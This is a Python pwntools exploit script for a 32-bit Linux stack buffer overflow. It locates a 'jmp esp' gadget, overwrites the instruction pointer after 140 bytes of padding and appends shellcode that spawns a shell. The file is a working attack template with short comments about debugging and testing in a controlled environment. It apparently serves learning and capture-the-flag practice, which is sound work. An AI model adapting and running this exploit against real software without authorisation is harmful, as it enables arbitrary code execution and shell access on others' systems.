from pwn import *
import sys

"""
Buffer Overflow Exploit Script
This script demonstrates exploiting a buffer overflow vulnerability to overwrite the instruction pointer
and execute shellcode stored on the stack.

Usage:
- Ensure you have the vulnerable executable, pwntools, and GDB installed.
- Update the "./name-of-executable" with the actual path to your vulnerable executable.
- Run this script in an environment where you have permission to test and exploit vulnerabilities.

"""

# Update the context as per the executable file info
context.update(arch='i386', os='linux')

# Start a process for the vulnerable executable
io = process("./name-of-executable")

# Uncomment the following lines if you are using GDB for debugging the exploit
# gdb.attach(io, 'continue')
# pattern = cyclic(512)
# io.sendline(pattern)
# pause()
# sys.exit()

"""
During the debug process, after causing a crash, examine the value of the instruction pointer (EIP)
using 'info registers' command in GDB, and use cyclic_find to determine the offset.
"""

# Update the path to the vulnerable executable
binary = ELF("./name-of-executable")

# Find the jump ESP address in the executable
# This will be used to jump to our shellcode on the stack
jmp_esp = next(binary.search(asm("jmp esp")))

print("Jump ESP at: " + hex(jmp_esp))

# Construct the exploit payload
# 140 is the offset to the instruction pointer, found using cyclic_find
# Adjust this value based on your specific findings
padding = "A" * 140
payload = padding.encode() + p32(jmp_esp) + asm(shellcraft.sh())

# Test exploit locally by sending the payload to the process
io.sendline(payload)
io.interactive()

"""
Note: This script assumes you have identified the correct offset and have a vulnerable executable
that allows for an instruction pointer overwrite. Always test and develop exploits in a controlled
environment.
"""
